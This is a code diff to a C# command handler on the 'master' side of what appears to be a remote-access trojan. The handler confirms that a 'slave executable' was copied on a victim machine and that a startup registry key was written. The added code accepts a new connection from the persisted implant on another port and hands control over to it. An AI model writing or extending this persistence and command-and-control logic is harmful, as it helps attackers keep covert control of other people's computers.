@@ -25,12 +25,13 @@ namespace Master.Commands
 
         public void Process(List<string> args)
         {
-            if (GlobalCommandsManager.networkManager.ReadLine() == "KO")
+            var result = GlobalCommandsManager.networkManager.ReadLine();
+            if (result == "KO")
             {
                 ColorTools.WriteCommandError("Couldn't copy the slave executable to the specified location... Aborting");
                 return;
             }
-            ColorTools.WriteCommandSuccess($"Slave executable copied at {args[0]}");
+            ColorTools.WriteCommandSuccess($"Slave executable copied at {result}");
 
             if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
             {
@@ -47,7 +48,20 @@ namespace Master.Commands
                 ColorTools.WriteCommandSuccess("Wrote startup registry key at current user level");
             }
 
-            ColorTools.WriteCommandMessage("Please note that the non-persisted executable is still on the slave's machine and is still the one you are communicating with right now");
+            var masterNetworkManager = (MasterNetworkManager) GlobalCommandsManager.networkManager;
+            // Listen on another port
+            var socket = masterNetworkManager.TryAcceptSocket(masterNetworkManager.portNumber +  1, 10);
+            if (socket == null)
+            {
+                ColorTools.WriteCommandError("Couldn't establish connection with the persisted executable");
+                ColorTools.WriteCommandMessage("Please note that the non-persisted executable is still on the slave's machine and is the one you are communicating with right now");
+                GlobalCommandsManager.networkManager.WriteLine("noconnect");
+                return;
+            }
+
+            GlobalCommandsManager.networkManager.WriteLine("connected");
+            masterNetworkManager.InstanciateStreams(socket);
+            ColorTools.WriteCommandSuccess("Connected via persisted executable (destroyed old one)");
         }
     }
 }
